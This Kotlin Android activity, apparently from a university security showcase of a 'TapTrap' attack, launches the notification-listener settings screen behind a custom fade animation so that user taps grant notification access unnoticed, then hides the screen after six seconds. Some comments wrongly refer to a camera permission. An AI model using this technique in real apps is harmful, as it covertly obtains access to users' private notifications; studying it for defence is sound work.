package edu.hm.itsec.taptrapattackshowcase.notificationservice

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.CountDownTimer
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityOptionsCompat
import edu.hm.itsec.taptrapattackshowcase.R
import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityNotificationServiceBinding

class NotificationServiceActivity : AppCompatActivity() {

    private val TAG = "NotificationServiceActivity"

    private lateinit var binding: ActivityNotificationServiceBinding

    private var granted: Boolean = false

    private var resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            granted = true
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityNotificationServiceBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)

        binding.test.setOnClickListener {
            startAttack()
        }
    }

    private fun startAttack() {
        // cancel attack if permission has already been granted
        if (notificationListenerServicePermissionGranted(applicationContext)) return

        Log.d(TAG, "Starting attack...")

        val componentName = ComponentName(
            applicationContext,
            NotificationListenerService::class.java
        )

        // Creates an Intent to open the camera permission request screen
        val intent = Intent("android.settings.NOTIFICATION_LISTENER_DETAIL_SETTINGS").apply {
            putExtra("android.provider.extra.NOTIFICATION_LISTENER_COMPONENT_NAME", componentName.flattenToString())
        }

        // Creates the custom animation for the activity transition
        val activityOptions =
            ActivityOptionsCompat.makeCustomAnimation(this, R.anim.fade_in_settings_notifications, R.anim.fade_out)

        // Starts the camera permission request screen with the animation
        resultLauncher.launch(intent, activityOptions)

        // relaunch the TapGameActivity to hide the permission request screen after 6 seconds
        object : CountDownTimer(6000, 1000) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {
                val tapGameActivityIntent = Intent(
                    this@NotificationServiceActivity,
                    NotificationServiceActivity::class.java
                )
                if (!granted) {
                    val toast = Toast(applicationContext)
                    toast.setText(R.string.failed_runtime_permission_toast)
                    toast.show()
                    startActivity(tapGameActivityIntent)
                }
            }
        }.start()
    }

    private fun notificationListenerServicePermissionGranted(context: Context): Boolean {
        val cn = ComponentName(context, NotificationListenerService::class.java)
        val enabledListeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false

        return enabledListeners.contains(cn.flattenToString())
    }
}